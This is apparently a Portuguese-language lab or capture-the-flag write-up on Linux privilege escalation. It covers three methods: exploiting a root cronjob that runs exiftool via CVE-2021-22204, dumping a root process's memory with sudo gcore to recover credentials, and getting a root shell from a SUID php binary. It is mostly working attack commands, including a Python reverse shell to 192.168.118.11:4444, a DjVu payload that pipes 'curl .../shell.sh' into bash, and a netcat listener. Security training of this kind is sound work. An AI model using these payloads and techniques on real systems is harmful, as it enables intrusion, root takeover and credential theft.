## Privilege Escalation

### Cronjob Enumeration

Identificamos uma entrada no arquivo `/etc/crontab` que executa o script `/opt/image-exif.sh` como root a cada minuto.

```
# Exibindo o conteúdo de /etc/crontab
cat /etc/crontab
```

**Cronjob Identificado**:
```
cat /etc/crontab
# /etc/crontab: system-wide crontab
...
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
```

### Script Analysis (`/opt/image-exif.sh`)

O script realiza processamento de metadados em imagens JPG usando `exiftool` e salva os dados processados em `/opt/metadata`.

```
# Exibindo o conteúdo de /opt/image-exif.sh
cat /opt/image-exif.sh
```

**Conteúdo do Script**:
```
#!/bin/bash
IMAGES='/var/www/html/subrion/uploads'
META='/opt/metadata'
FILE=$(openssl rand -hex 5)
LOGFILE="$META/$FILE"
ls $IMAGES | grep "jpg" | while read filename; do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done
```

**Análise**: O script executa `exiftool` em cada arquivo JPG no diretório de uploads, com potencial de exploração caso o `exiftool` seja vulnerável.

### Exploração de Arbitrary Code Execution com ExifTool (CVE-2021-22204)

Descoberta de vulnerabilidade de execução de código remoto (RCE) no ExifTool, documentada em CVE-2021-22204. Utilizamos o `djvumake` para criar um arquivo malicioso no formato DjVu.

1. **Instalar Dependência**: `djvulibre-bin` para gerar o arquivo DjVu.
   ```
   sudo apt-get update && sudo apt-get install -y djvulibre-bin
   ```

2. **Criar Arquivo de Payload**:
   - `shell.sh`: Script de reverse shell em Python.
   - `exploit`: Exploit para chamar `shell.sh` remotamente.
   
   ```
   # shell.sh (conteúdo do reverse shell)
   cat << 'EOF' > shell.sh
   #!/bin/bash
   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   EOF
   ```

   ```
   # exploit (comando para executar o reverse shell via curl)
   cat << 'EOF' > exploit
   (metadata "\c${system ('curl http://192.168.118.11/shell.sh | bash')};")
   EOF
   ```

3. **Gerar Arquivo DjVu Malicioso**:
   ```
   djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
   mv exploit.djvu exploit.jpg
   ```

4. **Transferir o Arquivo para o Servidor**:
   ```
   wget http://192.168.118.11/exploit.jpg -O /var/www/html/subrion/uploads/exploit.jpg
   ```

5. **Ouvir Conexão Reversa**:
   Após um minuto, o cronjob executará o payload, e a shell reversa será conectada à porta 4444.

   ```
   nc -lvnp 4444
   ```

**Resultado**:
```
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Sudo gcore

### Passo 1: Verificar Permissões sudo
Comece verificando se o usuário atual possui permissões para executar comandos com `sudo`.

```
sudo -l
```

> Procure por comandos que podem ser executados com privilégios elevados, especialmente aqueles que permitem gerar dumps de memória, como `/usr/bin/gcore`.

### Passo 2: Identificar Processos de Interesse
Liste todos os processos em execução para localizar algum que contenha informações sensíveis, como credenciais ou configurações confidenciais.

```
ps auxwww
```

> Identifique o PID de um processo interessante, como `/usr/bin/password-store`, que está sendo executado como root.


### Passo 3: Gerar Dump de Memória com gcore
Use `gcore` para criar um core dump do processo alvo. Substitua `<PID>` pelo PID do processo de interesse.

```
sudo /usr/bin/gcore <PID>
```

> Exemplo: `sudo /usr/bin/gcore 492`

> Isso criará um arquivo `core.<PID>` no diretório atual, contendo uma cópia da memória do processo.

### Passo 4: Analisar o Dump de Memória com strings
Use o comando `strings` para analisar o core dump em busca de informações em texto claro (cleartext), como credenciais.

```
strings core.<PID>
```

> Exemplo: `strings core.492`

> Procure por palavras como "password", "user", ou nomes de aplicativos que possam conter credenciais.

### Passo 5: Usar Credenciais para Escalonar Privilégios
Se encontrar credenciais para o usuário root, utilize-as para escalonar privilégios.

```
su root
```

> Insira a senha encontrada no core dump para obter acesso root.



### Resumo do Processo

1. **Verificar permissões sudo**: `sudo -l`
2. **Identificar processos de interesse**: `ps auxwww`
3. **Gerar dump com gcore**: `sudo /usr/bin/gcore <PID>`
4. **Analisar o dump com strings**: `strings core.<PID>`
5. **Escalonar privilégios**: `su root`

---

### SUID Binaries 

Identificar Binaries SUID Interessantes

Para buscar binaries SUID, use o comando abaixo e filtre resultados desnecessários:

```
find / -perm -u=s -type f 2>/dev/null | grep -v 'snap'
```

Exemplo de saída relevante:
```
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chfn
/usr/bin/at
/usr/bin/php7.4
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
```

### Exploração de SUID com PHP

Se `/usr/bin/php7.4` estiver listado como um binary SUID, podemos usar isso para escalonar privilégios. Utilize o site [GTFOBins](https://gtfobins.github.io/) para verificar se há um método conhecido para explorar o SUID de PHP.

Comando de Exploração com PHP (GTFOBins)

Para ganhar acesso root usando o SUID de PHP, execute o seguinte comando:

```
/usr/bin/php7.4 -r 'system("/bin/sh");'
```

Resumo do Procedimento

1. **Identificar binaries SUID**: `find / -perm -u=s -type f 2>/dev/null | grep -v 'snap'`
2. **Confirmar o uso de GTFOBins**: Verifique [GTFOBins - PHP](https://gtfobins.github.io/gtfobins/php/#suid) para explorar o binary SUID.
3. **Executar Exploit**: `sudo /usr/bin/php7.4 -r 'system("/bin/sh");'` para obter um shell como root.
